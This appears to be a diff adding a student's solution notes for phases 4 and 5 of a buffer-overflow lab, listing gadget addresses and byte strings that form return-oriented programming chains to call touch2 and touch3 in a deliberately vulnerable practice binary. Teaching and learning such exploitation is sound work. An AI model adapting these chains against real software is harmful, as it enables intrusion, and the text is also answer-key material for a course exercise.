@@ -1,0 +1,61 @@
+phase_4:
+0x4019a2    mov    %rax,%rdi
+0x4019cc    pop    %rax
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+cc 19 40 00 00 00 00 00 /* popq    %rax */
+fa 97 b9 59 00 00 00 00 /* -> %rax */
+a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */
+ec 17 40 00 00 00 00 00 /* touch2 */
+
+phase_5:
+59b997fa
+35 39 62 39 39 37 66 61
+61 66 37 39 39 62 39 35
+ff ff ff ff ff ff ff d0 (-0x30)
+0x4019a2    movq    %rax,%rdi
+0x4019cc    popq    %rax
+0x401aad    movq    %rsp,%rax 
+0x401a94    andb    %al,%al
+0x401a86    movl    %esp,%eax
+0x401a80    orb     %cl,%cl
+0x401a79    cmpb    %dl,%dl
+0x401a69    movl    %edx,%ecx
+            orb     %bl,%bl
+0x401a52    orb     %dl,%dl
+0x401a42    movl    %eax,%edx
+            testb   %al,%al
+0x401a34    movl    %edx,%ecx
+            cmpb    %cl,%cl
+0x401a30    orb     %bl,%bl
+0x401a27    movl    %ecx,%esi
+            cmpb    %al,%al
+0x401a20    movl    %eax,%edx
+            addb    %cl,%cl
+0x401a13    movl    %ecx,%esi
+0x401a00    testb   %al,%al
+0x4019d6    lea     (%rdi,%rsi,1),%rax
+0x4019dd    movl    %eax,%edx
+0x4019dc    popq    %rsp
+            movl    %eax,%edx
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+ad 1a 40 00 00 00 00 00 /* movq    %rsp,%rax */
+a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */
+cc 19 40 00 00 00 00 00 /* popq    %rax */
+48 00 00 00 00 00 00 00 
+dd 19 40 00 00 00 00 00 /* movl    %eax,%edx */
+34 1a 40 00 00 00 00 00 /* movl    %edx,%ecx */
+13 1a 40 00 00 00 00 00 /* movl    %ecx,%esi */
+d6 19 40 00 00 00 00 00 /* lea     (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* touch3 */
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
